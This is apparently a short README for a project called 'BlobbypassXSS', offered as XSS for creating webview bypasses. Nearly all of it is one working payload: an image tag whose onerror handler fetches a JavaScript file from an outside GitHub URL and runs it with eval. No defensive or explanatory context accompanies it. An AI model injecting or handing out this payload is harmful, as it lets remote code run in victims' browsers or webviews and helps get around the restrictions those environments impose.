#### BlobbypassXSS
# A little bit of XSS that can be used for creating webview bypasses
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/blobbypass.js").then(r=>r.text()).then(c=>eval(c)) '>
```
